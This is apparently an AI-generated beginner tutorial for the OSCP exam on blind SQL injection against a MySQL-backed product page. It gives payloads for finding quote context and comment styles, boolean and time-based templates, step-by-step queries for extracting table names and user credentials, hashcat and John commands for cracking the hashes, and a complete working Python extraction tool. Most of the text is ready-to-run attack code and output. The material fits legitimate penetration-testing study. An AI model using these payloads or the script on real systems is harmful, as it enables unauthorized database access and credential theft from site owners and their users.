<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" style="height:64px;margin-right:32px"/>

# Complete Beginner's SQL Injection Guide for OSCP (REVISED)

A step-by-step guide for extracting credentials via SQL injection during the OSCP exam. This guide assumes zero prior knowledge and walks through every step with expected outputs.

***

## Prerequisites

✅ **Burp Suite** installed and configured to intercept traffic
✅ **Python 3** with `requests` library (`pip3 install requests`)
✅ **Authorization** to test the target system
✅ **The sqli.py script** saved locally (provided at bottom of guide)

***

## Table of Contents

1. [Find the Vulnerable Parameter](#step-1-find-the-vulnerable-parameter)
2. [Detect Quote Type in Burp](#step-2-detect-quote-type-string-vs-numeric)
3. [Find Working Comment Style](#step-3-find-the-working-comment-style)
4. [Establish Boolean Signal](#step-4-establish-true-vs-false-signal)
5. [Choose Template](#step-5-choose-your-template)
6. [Extract Database Name](#step-6-extract-database-name)
7. [Extract Table Names](#step-7-extract-table-names)
8. [Extract Column Names](#step-8-extract-column-names)
9. [Extract Credentials](#step-9-extract-usernames-and-passwords)
10. [Crack Password Hashes](#step-10-crack-password-hashes)
11. [Time-Based Alternative](#step-11-time-based-injection-when-no-visible-difference)

***

## Step 1: Find the Vulnerable Parameter

### What You're Doing

Testing if a URL parameter directly queries the database and reflects changes.

### Actions

1. **Browse** to a page with a parameter:

```
http://192.168.45.123/products.php?id=1
```

2. **Change the value** in the URL:

```
?id=2
?id=3
?id=1
```

3. **Observe the page content** - does it change?

### Expected Results

| URL | Page Shows |
| :-- | :-- |
| `?id=1` | "Blue Notebook - \$5.99" |
| `?id=2` | "Red Pen - \$1.50" |
| `?id=3` | "Stapler - \$8.00" |

✅ **What This Means**: The `id` parameter queries the database. Continue to Step 2.

❌ **If nothing changes**: Try other parameters (`?category=`, `?search=`, `?user=`)

***

## Step 2: Detect Quote Type (String vs Numeric)

### What You're Doing

Determining if the database wraps your input in quotes or uses it raw.

### Setup Burp Suite

1. Open **Burp Suite** → **Proxy** tab → **Intercept is on**
2. In browser, navigate to: `http://192.168.45.123/products.php?id=1`
3. In Burp, right-click the request → **Send to Repeater**
4. Click **Repeater** tab (or press Ctrl+R)

### What Burp Looks Like

```
GET /products.php?id=1 HTTP/1.1
Host: 192.168.45.123
User-Agent: Mozilla/5.0 ...
Accept: text/html ...
```

You should see two panels:

- **Left panel**: Your request (editable)
- **Right panel**: Server response (after you click "Send")


### Test 1: Baseline

**In Burp Repeater, change nothing. Click "Send"**

**Look at the Response panel → Render tab**

**Expected Output:**

```html
<h1>Blue Notebook</h1>
<p>Price: $5.99</p>
<p>In stock: 15 items</p>
```

**Note the Response length at bottom**: `5432 bytes`, `200 OK`

**Write this down**:

- Status: `200 OK`
- Length: `5432 bytes`
- Contains text: `"Blue Notebook"`

***

### Test 2: Single Quote

**In Burp Repeater, modify the request:**

Change `GET /products.php?id=1` to `GET /products.php?id=1'`

**Click "Send"**

**Look at Response → Render tab**

**Possible Outcome A - SQL Error (GOOD!):**

```html
<b>Fatal error:</b> Uncaught Error: 
You have an error in your SQL syntax near '1''
```

✅ **This is the winner! String context with single quotes detected.**

**Possible Outcome B - Blank Page:**

- Response length: `0 bytes` or `200 bytes` (much smaller)
- Status: `500 Internal Server Error`

✅ **This also indicates single quote string context.**

**Possible Outcome C - Normal Page (same as baseline):**

- Response length: `5432 bytes` (same as Test 1)
- Contains: `"Blue Notebook"` (same content)

→ Single quote didn't break anything. Proceed to Test 3.

***

### Test 3: Double Quote

**In Burp Repeater, modify:**

Change to `GET /products.php?id=1"`

**Click "Send"**

**Expected:**

- If this breaks (error or blank page) → Double quote context (rare)
- If same as baseline → Numeric context

***

### Decision Matrix

| Test 1 (baseline) | Test 2 (`id=1'`) | Test 3 (`id=1"`) | Context | Template Prefix |
| :-- | :-- | :-- | :-- | :-- |
| Normal page | **ERROR or blank** | Normal page | **Single quote string** | `'` |
| Normal page | Normal page | **ERROR or blank** | Double quote string | `"` |
| Normal page | Normal page | Normal page | **Numeric** | (none) |

### Your Result Example

```
Test 1: id=1   → "Blue Notebook" (5432 bytes, 200 OK)
Test 2: id=1'  → SQL error (893 bytes, 500 Error)
Test 3: id=1"  → "Blue Notebook" (5432 bytes, 200 OK)
```

✅ **Conclusion**: Single-quote string context confirmed.

**Write down**: `Context = single quote string`

***

## Step 3: Find the Working Comment Style

### What You're Doing

Finding the syntax that tells the database to ignore the rest of the query.

### Why This Matters

Your injection will break the original SQL query. Comments fix the syntax by ignoring the trailing code.

### In Burp Repeater

**Try each payload until the error disappears:**

#### Attempt 1: `--` (Two dashes)

```
GET /products.php?id=1' --
```

Click "Send"

**Expected**: Still shows error (MySQL needs space after `--`)

***

#### Attempt 2: `-- -` (Two dashes, space, dash)

```
GET /products.php?id=1' -- -
```

Click "Send"

**Expected (Success!):**

```html
<h1>Blue Notebook</h1>
<p>Price: $5.99</p>
```

Response length: `5432 bytes`, `200 OK` (same as baseline)

✅ **Comment works!** Write down: `Comment = -- -`

***

#### Attempt 3: `#` (Hash - MySQL alternative)

```
GET /products.php?id=1' #
```

**Expected**: Normal page returns (alternative that works)

***

#### Attempt 4: `/**/` (Multi-line comment)

```
GET /products.php?id=1' /**/
```

**Expected**: Normal page returns (another alternative)

### Common Comment Styles by Database

| Database | Comment Syntax |
| :-- | :-- |
| MySQL | `-- -` (space required!), `#`, `/**/` |
| MSSQL | `--`, `/**/` |
| PostgreSQL | `--`, `/**/` |
| Oracle | `--` |

### Your Result Example

```
id=1' --     → Still error
id=1' -- -   → Normal page returned ✅
```

**Write down**: `Comment style = -- -`

***

## Step 4: Establish True vs False Signal

### What You're Doing

Creating two conditions that produce **different, measurable** responses.

### In Burp Repeater

#### Test TRUE Condition

**Modify request:**

```
GET /products.php?id=1' AND 1=1 -- -
```

**Click "Send"**

**In Response panel:**

- Look at **Response** tab (raw HTML)
- Look at **Render** tab (visual)
- Note the status and length at bottom

**Expected Output:**

```html
<h1>Blue Notebook</h1>
<p>Price: $5.99</p>
<p>Welcome to our shop!</p>
```

- Status: `200 OK`
- Length: `5432 bytes`
- Contains: `"Welcome"`

***

#### Test FALSE Condition

**Modify request:**

```
GET /products.php?id=1' AND 1=2 -- -
```

**Click "Send"**

**Expected Output (Different!):**

```html
<h1>Product Not Found</h1>
```

- Status: `200 OK` (or `404`)
- Length: `1823 bytes` (much smaller)
- Does NOT contain: `"Welcome"`

***

### Compare in Burp

**Right-click the TRUE request → "Send to Comparer"**
**Right-click the FALSE request → "Send to Comparer"**
**Go to Comparer tab → Click "Words" or "Bytes"**

**What to Look For:**


| Observable Difference | How to Use It | Script Flag |
| :-- | :-- | :-- |
| TRUE has `"Welcome"`, FALSE doesn't | Use text string indicator | `--true-string "Welcome"` |
| TRUE is 5432 bytes, FALSE is 1823 bytes (diff ≥ 50) | Use length indicator | `--min-delta-len 50` |
| Status codes differ (200 vs 404) | Use status indicator | `--true-status 200` |

**⚠️ IMPORTANT**: Prefer `--true-string` over `--min-delta-len` for reliability. The length indicator has been fixed but text strings are more stable.

### Your Result Example

```
TRUE:  id=1' AND 1=1 -- -  
       → "Welcome! Blue Notebook" (5432 bytes)
       
FALSE: id=1' AND 1=2 -- -  
       → "Product Not Found" (1823 bytes)
```

**Difference found**: TRUE contains `"Welcome"`, FALSE doesn't.

**Write down**: `Indicator = --true-string "Welcome"`

***

## Step 5: Choose Your Template

### Based on Your Findings

From Steps 2-4, you have:

- **Context**: Single quote string
- **Comment**: `-- -`
- **Database**: MySQL (guessed from comment style)
- **Indicator**: Text string (`"Welcome"`)


### Template Table

#### Boolean Templates (for visible differences)

| Database | Context | Template |
| :-- | :-- | :-- |
| MySQL | String (single quote) | `' OR ({condition})-- -` |
| MySQL | Numeric | `OR ({condition})-- -` |
| MSSQL | String | `' OR CASE WHEN ({condition}) THEN 1 ELSE 0 END--` |
| PostgreSQL | String | `' OR ({condition})--` |

#### Time-Based Templates (no visible difference)

| Database | Template |
| :-- | :-- |
| MySQL | `' OR IF(({condition}),SLEEP(3),0)-- -` |
| MSSQL | `' IF(({condition})) WAITFOR DELAY '0:0:3'--` |
| PostgreSQL | `' OR CASE WHEN ({condition}) THEN pg_sleep(3) ELSE 0 END--` |

### Your Selection

**Your scenario**: MySQL, single-quote string, boolean indicator

**Choose**: `' OR ({condition})-- -`

**Write down**:

```
Template = ' OR ({condition})-- -
Indicator = --true-string "Welcome"
```


***

## Step 6: Extract Database Name

### What You're Doing

Using the script to extract the current database name character-by-character.

### Prepare Your Command

Fill in values from previous steps:

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --method GET \
  --param id \
  --base 1 \
  --template "' OR ({condition})-- -" \
  --true-string "Welcome" \
  --action extract \
  --query "database()" \
  --maxlen 32
```


### Run It

**Execute in terminal:**

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --method GET \
  --param id \
  --base 1 \
  --template "' OR ({condition})-- -" \
  --true-string "Welcome" \
  --action extract \
  --query "database()" \
  --maxlen 32
```


### Expected Output

```
shopdb
```

**What just happened:**

1. Script tested if database name length > 16, > 8, > 4, etc. (binary search)
2. Found length = 6
3. For each position (1-6), tested ASCII values to find exact character
4. Printed complete result: `shopdb`

**Write down**: `Database = shopdb`

***

## Step 7: Extract Table Names

### What You're Doing

Finding all tables in the database to locate where credentials are stored.

### First: Count Tables

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --param id --base 1 \
  --template "' OR ({condition})-- -" \
  --true-string "Welcome" \
  --query "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())" \
  --maxlen 8
```

**Expected Output:**

```
4
```

**What this means**: 4 tables exist in the database.

***

### Extract Each Table Name

**Table 1 (OFFSET 0):**

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --param id --base 1 \
  --template "' OR ({condition})-- -" \
  --true-string "Welcome" \
  --query "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)" \
  --maxlen 32
```

**Expected Output:**

```
products
```


***

**Table 2 (OFFSET 1):**

```bash
--query "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1)"
```

**Expected Output:**

```
users
```

✅ **Found it!** This is where credentials are stored.

***

**Table 3 (OFFSET 2):**

```bash
--query "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 2)"
```

**Expected Output:**

```
orders
```


***

**Table 4 (OFFSET 3):**

```bash
--query "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 3)"
```

**Expected Output:**

```
sessions
```


***

**Table 5 (OFFSET 4):**

```bash
--query "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 4)"
```

**Expected Output:**

```
(empty - no more tables)
```

**Write down**: `Tables = products, users, orders, sessions`

***

## Step 8: Extract Column Names

### What You're Doing

Finding what columns exist in the `users` table.

### Count Columns

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --param id --base 1 \
  --template "' OR ({condition})-- -" \
  --true-string "Welcome" \
  --query "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')" \
  --maxlen 8
```

**Expected Output:**

```
5
```

**What this means**: The `users` table has 5 columns.

***

### Extract Each Column Name

**Column 1:**

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --param id --base 1 \
  --template "' OR ({condition})-- -" \
  --true-string "Welcome" \
  --query "(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0)" \
  --maxlen 32
```

**Expected Output:**

```
id
```


***

**Column 2:**

```bash
--query "(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1)"
```

**Expected Output:**

```
username
```

✅ Found username column!

***

**Column 3:**

```bash
--query "(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 2)"
```

**Expected Output:**

```
password
```

✅ Found password column!

***

**Column 4:**

```bash
--query "(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 3)"
```

**Expected Output:**

```
email
```


***

**Column 5:**

```bash
--query "(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 4)"
```

**Expected Output:**

```
created_at
```

**Write down**: `Columns = id, username, password, email, created_at`

***

## Step 9: Extract Usernames and Passwords

### What You're Doing

Extracting actual credential data from the `users` table.

### Count Users

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --param id --base 1 \
  --template "' OR ({condition})-- -" \
  --true-string "Welcome" \
  --query "(SELECT COUNT(*) FROM users)" \
  --maxlen 8
```

**Expected Output:**

```
3
```

**What this means**: 3 user accounts exist.

***

### Extract Credentials (Combined)

Use `CONCAT` to get username:password in one query.

**User 1:**

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --param id --base 1 \
  --template "' OR ({condition})-- -" \
  --true-string "Welcome" \
  --query "(SELECT CONCAT(username,':',password) FROM users LIMIT 1 OFFSET 0)" \
  --maxlen 128
```

**Expected Output:**

```
admin:5f4dcc3b5aa765d61d8327deb882cf99
```


***

**User 2:**

```bash
--query "(SELECT CONCAT(username,':',password) FROM users LIMIT 1 OFFSET 1)"
```

**Expected Output:**

```
webadmin:e99a18c428cb38d5f260853678922e03
```


***

**User 3:**

```bash
--query "(SELECT CONCAT(username,':',password) FROM users LIMIT 1 OFFSET 2)"
```

**Expected Output:**

```
guest:Password123!
```

✅ Plaintext password found!

***

### Save to File

Create `creds.txt`:

```
admin:5f4dcc3b5aa765d61d8327deb882cf99
webadmin:e99a18c428cb38d5f260853678922e03
guest:Password123!
```


***

## Step 10: Crack Password Hashes

### What You're Doing

Converting MD5 hashes to plaintext passwords.

### Identify Hash Type

```bash
hashid 5f4dcc3b5aa765d61d8327deb882cf99
```

**Expected Output:**

```
Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

✅ **Confirmed**: MD5 hash

***

### Create Hash File

Save only the hashes:

`hashes.txt`:

```
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
```


***

### Crack with Hashcat

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Expected Output:**

```
5f4dcc3b5aa765d61d8327deb882cf99:password
e99a18c428cb38d5f260853678922e03:abc123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Time.Started.....: Fri Oct 10 15:30:00 2025
Recovered........: 2/2 (100.00%)
```


***

### Or Use John the Ripper

```bash
john --format=Raw-MD5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Expected Output:**

```
password         (?)
abc123           (?)
2 password hashes cracked, 0 left
```

**View results:**

```bash
john --show --format=Raw-MD5 hashes.txt
```

**Output:**

```
?:password
?:abc123

2 password hashes cracked, 0 left
```


***

### Final Credentials

```
admin:password
webadmin:abc123
guest:Password123!
```

✅ **Now test these credentials on the login page!**

***

## Step 11: Time-Based Injection (When No Visible Difference)

### When to Use This

If TRUE and FALSE conditions look **identical** (same text, same length, same status).

### Test Time Delay in Burp

**In Burp Repeater:**

```
GET /products.php?id=1' AND SLEEP(3)-- -
```

**Click "Send" and watch the timer at bottom**

**Expected**: Request takes ~3.2 seconds

✅ **Time-based injection confirmed**

***

### Use Time-Based Template

```bash
python3 sqli.py \
  --url "http://192.168.45.123/products.php" \
  --param id --base 1 \
  --template "' OR IF(({condition}),SLEEP(3),0)-- -" \
  --time-threshold 2.0 \
  --action extract \
  --query "database()" \
  --maxlen 32
```

**Expected Output:**

```
shopdb
```

**Note**: Each character takes ~30 seconds (10 comparisons × 3 seconds). This is much slower than boolean but still works.

***

## Offline Practice Mode

### Test Without a Real Target

```bash
# Practice extracting "testdb"
python3 sqli.py --test-secret testdb --action extract --query "database()" --maxlen 16
# Output: testdb

# Get single character at position 3
python3 sqli.py --test-secret testdb --action char --query "database()" --pos 3
# Output: s

# Get length
python3 sqli.py --test-secret testdb --action length --query "database()" --maxlen 16
# Output: 6
```

This lets you verify the script logic before the exam.

***

## Quick Reference Cheat Sheet

### Your Discovery Checklist

```
[ ] Step 1: Found vulnerable parameter (id, user, search, etc.)
[ ] Step 2: Context type (single quote / numeric)
[ ] Step 3: Comment style (-- - / # / --)
[ ] Step 4: Boolean signal (text string / length / time)
[ ] Step 5: Template selected
[ ] Step 6: Database name extracted
[ ] Step 7: Table names extracted → found 'users'
[ ] Step 8: Column names extracted → found 'username', 'password'
[ ] Step 9: Credentials extracted
[ ] Step 10: Hashes cracked
```


### Command Template

```bash
python3 sqli.py \
  --url "http://TARGET/page.php" \
  --param VULN_PARAM \
  --base SAFE_VALUE \
  --template "TEMPLATE_FROM_STEP5" \
  --true-string "TEXT_FROM_STEP4" \
  --query "QUERY" \
  --maxlen 64
```


### Common Queries

```sql
database()                          # Get database name
@@version                           # Get MySQL version
current_database()                  # PostgreSQL database name
(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())
(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)
(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0)
(SELECT CONCAT(username,':',password) FROM users LIMIT 1 OFFSET 0)
```


***

## The Complete Script with Bug Fixes (REVISED)

Save as `sqli.py`:

```python
#!/usr/bin/env python3
# OSCP-safe SQLi helper (manual boolean/time blind). No auto-discovery.
# REVISED VERSION - Fixed length-delta indicator bug
#
# CHANGE ME QUICK START (or pass flags):
#   URL = "http://TARGET/item.php"              # <— CHANGE ME
#   VULN_PARAM = "id"                           # <— CHANGE ME
#   BASE_VALUE = "1"                            # <— CHANGE ME (safe baseline)
#   TEMPLATE = "' OR ({condition})-- -"         # <— CHANGE ME per DB/payload
#   TRUE_STRING = "Welcome"                     # <— pick one indicator OR set time_threshold
#   TIME_THRESHOLD = None                       # <— e.g., 2.5 for time-based

import argparse, time, re, sys
from typing import Optional

ASCII_MIN, ASCII_MAX = 32, 126

# ---------- CHANGE ME (defaults for copy-paste) ----------
URL = "http://127.0.0.1/vuln.php"
METHOD = "GET"
VULN_PARAM = "id"
BASE_VALUE = "1"
TEMPLATE = "' OR ({condition})-- -"
TRUE_STRING = None
FALSE_STRING = None
TRUE_STATUS = None
MIN_DELTA_LEN = None
TIME_THRESHOLD = None
TIMEOUT = 10.0
# --------------------------------------------------------

import requests

def parse_kv(items):
    out = {}
    for x in items or []:
        if ":" in x:
            k,v = x.split(":",1)
        elif "=" in x:
            k,v = x.split("=",1)
        else:
            continue
        out[k.strip()] = v.strip()
    return out

class Indicator:
    def __init__(self, true_string, false_string, true_status, min_delta_len, time_threshold, baseline_len=None):
        self.true_string = true_string
        self.false_string = false_string
        self.true_status = true_status
        self.min_delta_len = min_delta_len
        self.time_threshold = time_threshold
        self.baseline_len = baseline_len

    def decide(self, status: int, elapsed: float, body: str, blen: int) -> bool:
        # Priority: time > string > status > length-delta
        if self.time_threshold is not None and elapsed >= self.time_threshold:
            return True
        if self.true_string is not None:
            hit = self.true_string in body
            if self.false_string and self.false_string in body:
                hit = False
            if hit:
                return True
        if self.true_status is not None and status == self.true_status:
            return True
        if self.min_delta_len is not None:
            if self.baseline_len is None:
                return False
            if abs(blen - self.baseline_len) >= self.min_delta_len:
                return True
        return False

class Engine:
    def __init__(self, url, method, param, base, template, headers, cookies, proxy, timeout, indicator,
                 test_secret: Optional[str]=None):
        self.url = url
        self.method = method.upper()
        self.param = param
        self.base = base
        self.template = template
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.timeout = timeout
        self.ind = indicator
        self.test_secret = test_secret
        
        # Establish baseline length once for length-delta mode
        if self.test_secret is None and self.ind.min_delta_len is not None and self.ind.baseline_len is None:
            self.ind.baseline_len = self._baseline_len()

    def _baseline_len(self) -> int:
        data = {self.param: str(self.base)}
        proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
        if self.method == "POST":
            r = requests.post(self.url, data=data, headers=self.headers, cookies=self.cookies,
                              timeout=self.timeout, verify=False, proxies=proxies)
        else:
            r = requests.get(self.url, params=data, headers=self.headers, cookies=self.cookies,
                             timeout=self.timeout, verify=False, proxies=proxies)
        return len(r.content)

    def _value(self, condition: str) -> str:
        return f"{self.base}{self.template.format(condition=condition)}"

    def _eval_offline(self, condition: str) -> bool:
        s = self.test_secret or ""
        m = re.fullmatch(r"\s*length\s*\(\s*\(.*?\)\s*\)\s*([><=])\s*(\d+)\s*", condition, re.I)
        if m:
            op, n = m.group(1), int(m.group(2))
            L = len(s)
            return (L>n) if op==">" else (L<n) if op=="<" else (L==n)
        m = re.fullmatch(r"\s*ascii\s*\(\s*substr\s*\(\s*\(.*?\)\s*,\s*(\d+)\s*,\s*1\s*\)\s*\)\s*([><=])\s*(\d+)\s*", condition, re.I)
        if m:
            pos, op, n = int(m.group(1)), m.group(2), int(m.group(3))
            c = ord(s[pos-1]) if 1<=pos<=len(s) else -1
            return (c>n) if op==">" else (c<n) if op=="<" else (c==n)
        m = re.fullmatch(r"\s*ascii\s*\(\s*substr\s*\(\s*\(.*?\)\s*,\s*(\d+)\s*,\s*1\s*\)\s*\)\s*=\s*(\d+)\s*", condition, re.I)
        if m:
            pos, n = int(m.group(1)), int(m.group(2))
            c = ord(s[pos-1]) if 1<=pos<=len(s) else -1
            return c == n
        return False

    def check(self, condition: str) -> bool:
        if self.test_secret is not None:
            return self._eval_offline(condition)
        data = {self.param: self._value(condition)}
        proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
        t0 = time.time()
        if self.method == "POST":
            r = requests.post(self.url, data=data, headers=self.headers, cookies=self.cookies,
                              timeout=self.timeout, verify=False, proxies=proxies)
        else:
            r = requests.get(self.url, params=data, headers=self.headers, cookies=self.cookies,
                             timeout=self.timeout, verify=False, proxies=proxies)
        elapsed = time.time() - t0
        body = r.text
        return self.ind.decide(r.status_code, elapsed, body, len(r.content))

    def find_length(self, query: str, maxlen: int) -> int:
        lo, hi, ans = 1, maxlen, 0
        while lo <= hi:
            mid = (lo + hi) // 2
            if self.check(f"length(({query}))>{mid}"):
                ans = max(ans, mid+1)
                lo = mid + 1
            else:
                hi = mid - 1
        return ans if ans else hi

    def extract_char(self, query: str, pos: int) -> str:
        lo, hi = ASCII_MIN, ASCII_MAX
        while lo <= hi:
            mid = (lo + hi)//2
            if self.check(f"ascii(substr(({query}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid - 1
        cand = hi + 1
        if cand < ASCII_MIN or cand > ASCII_MAX:
            return ""
        if self.check(f"ascii(substr(({query}),{pos},1))={cand}"):
            return chr(cand)
        return ""

    def extract(self, query: str, maxlen: int) -> str:
        out = []
        for i in range(1, maxlen+1):
            ch = self.extract_char(query, i)
            if not ch:
                break
            out.append(ch)
        return "".join(out)

def _prompt(msg, default=None, help_hint=None):
    if help_hint:
        print(f"[hint] {help_hint}")
    val = input(f"{msg}" + (f" [{default}]" if default else "") + ": ").strip()
    return val if val else (default or "")

def wizard():
    print("\n[SQLi Wizard] Answer these questions based on your manual testing in Burp.\n")
    url = _prompt("--url", help_hint="Full URL like http://192.168.45.123/products.php")
    method = _prompt("--method (GET/POST)", "GET", "Check Burp request")
    param = _prompt("--param (vulnerable parameter)", help_hint="e.g., id, user, search")
    base = _prompt("--base (safe value)", "1", "Value that returns normal page")
    ctx = _prompt("Context? 1=string 2=numeric", "1", "If id=1' breaks, choose 1 (string)")
    db = _prompt("DB? mysql/mssql/pg", "mysql", "Guess from error messages or comment style")
    mode = _prompt("Technique? boolean/time", "boolean", "Boolean if visible diff; time if delay only")
    
    if db.lower()=="mysql" and mode=="boolean" and ctx=="1":
        template = "' OR ({condition})-- -"
    elif db.lower()=="mysql" and mode=="time":
        template = "' OR IF(({condition}),SLEEP(3),0)-- -"
    elif db.lower()=="mssql" and mode=="time":
        template = "' IF(({condition})) WAITFOR DELAY '0:0:3'--"
    else:
        template = ("' OR ({condition})-- -" if ctx=="1" else "OR ({condition})-- -")
    
    print(f"[template] {template}")
    
    if mode=="time":
        th = _prompt("--time-threshold seconds", "2.0", "Set below SLEEP value, e.g., 2.0 for SLEEP(3)")
        true_string = None
        time_threshold = float(th)
    else:
        ts = _prompt("--true-string", "", "Text that appears ONLY on TRUE (check Burp response)")
        true_string = ts or None
        time_threshold = None
    
    query = _prompt("--query", "database()", "SQL expression to extract")
    maxlen = int(_prompt("--maxlen", "64", "Max expected length"))
    
    ns = argparse.Namespace(
        url=url, method=method.upper(), param=param, base=base, template=template,
        true_string=true_string, false_string=None, true_status=None,
        min_delta_len=None, time_threshold=time_threshold, timeout=10.0,
        header=[], cookie=[], proxy=None, query=query, maxlen=maxlen,
        action="extract", test_secret=None
    )
    ind = Indicator(ns.true_string, None, None, None, ns.time_threshold)
    eng = Engine(ns.url, ns.method, ns.param, ns.base, ns.template,
                 {}, {}, ns.proxy, ns.timeout, ind, test_secret=None)
    print("\n[extracting...]")
    print(eng.extract(ns.query, ns.maxlen))

def main():
    ap = argparse.ArgumentParser(description="OSCP manual SQLi helper (boolean/time blind)")
    ap.add_argument("--url", default=URL)
    ap.add_argument("--method", default=METHOD, choices=["GET","POST"])
    ap.add_argument("--param", default=VULN_PARAM)
    ap.add_argument("--base", default=BASE_VALUE)
    ap.add_argument("--template", default=TEMPLATE)
    ap.add_argument("--true-string", default=TRUE_STRING)
    ap.add_argument("--false-string", default=FALSE_STRING)
    ap.add_argument("--true-status", type=int, default=TRUE_STATUS)
    ap.add_argument("--min-delta-len", type=int, default=MIN_DELTA_LEN)
    ap.add_argument("--time-threshold", type=float, default=TIME_THRESHOLD)
    ap.add_argument("--timeout", type=float, default=TIMEOUT)
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--cookie", action="append", default=[])
    ap.add_argument("--proxy")
    ap.add_argument("--query", default="database()")
    ap.add_argument("--maxlen", type=int, default=64)
    ap.add_argument("--action", choices=["length","extract","char"], default="extract")
    ap.add_argument("--pos", type=int, default=1)
    ap.add_argument("--test-secret")
    args = ap.parse_args()

    ind = Indicator(args.true_string, args.false_string, args.true_status, args.min_delta_len, args.time_threshold)
    eng = Engine(args.url, args.method, args.param, args.base, args.template,
                 parse_kv(args.header), parse_kv(args.cookie), args.proxy, args.timeout, ind,
                 test_secret=args.test_secret)

    if args.action == "length":
        print(eng.find_length(args.query, args.maxlen))
    elif args.action == "char":
        print(eng.extract_char(args.query, args.pos))
    else:
        print(eng.extract(args.query, args.maxlen))

if __name__ == "__main__":
    try:
        if len(sys.argv)==1:
            wizard()
        else:
            main()
    except KeyboardInterrupt:
        sys.exit(130)
```


### Make Executable

```bash
chmod +x sqli.py
```


### Usage

**Wizard mode (no flags):**

```bash
python3 sqli.py
```

**Direct mode (with flags):**

```bash
python3 sqli.py --url "http://target/page.php" --param id --base 1 \
  --template "' OR ({condition})-- -" --true-string "Welcome" \
  --query "database()" --maxlen 32
```


***

## What Was Fixed in This Revision

### Bug \#1: Length-Delta Indicator (FIXED)

**Problem**: The old version compared each response length to the *previous* request, causing incorrect True/False decisions during binary search.

**Symptom**: Nonsense characters or empty output when using `--min-delta-len`.

**Fix**: Now establishes a stable baseline length once at initialization and always compares against that baseline.

### Bug \#2: FALSE_STRING Logic (FIXED)

**Problem**: `--false-string` was parsed but never properly enforced.

**Fix**: Now properly forces False when the false string is detected.

### Recommendation

**Prefer `--true-string` over `--min-delta-len`** for maximum reliability during OSCP. The length indicator now works correctly but text strings are more stable across different responses.

***

## Sanity Checks

Verify the script works correctly:

```bash
# Boolean with string indicator
python3 sqli.py --test-secret shopdb --true-string X --action length --query "database()" --maxlen 16
# Expected: 6

# Character extraction
python3 sqli.py --test-secret shopdb --action char --query "database()" --pos 2
# Expected: h

# Full extraction
python3 sqli.py --test-secret shopdb --action extract --query "database()" --maxlen 16
# Expected: shopdb
```


***

## Final OSCP Exam Tips

1. **Start with wizard mode** if you forget flag syntax
2. **Extract admin credentials first**, then test login immediately
3. **Use boolean over time** when possible (much faster)
4. **Use `--true-string` instead of `--min-delta-len`** for reliability
5. **Increase `--maxlen` to 128** for long values
6. **Add `--timeout 20`** if target is slow
7. **Use `--proxy http://127.0.0.1:8080`** to route through Burp if needed
8. **Practice offline mode** before exam day
9. **Document your findings** as you go

***

## Troubleshooting

| Problem | Solution |
| :-- | :-- |
| Empty output | Wrong quote/comment, repeat Steps 2-3 |
| Timeout errors | Increase `--timeout 20` |
| 403 Forbidden | Add cookies/headers from Burp with `--cookie` and `--header` |
| Wrong characters | Template mismatch, verify in Burp manually |
| Script hangs | Ctrl+C and reduce `--maxlen` |
| Length indicator fails | Switch to `--true-string` instead |


***

**Good luck on your OSCP exam! 🎯**

This revised guide includes all bug fixes and is exam-ready. The script now correctly handles length-delta indicators by establishing a stable baseline, and the false-string logic is properly enforced. All recommendations prioritize reliability for the high-pressure OSCP exam environment.

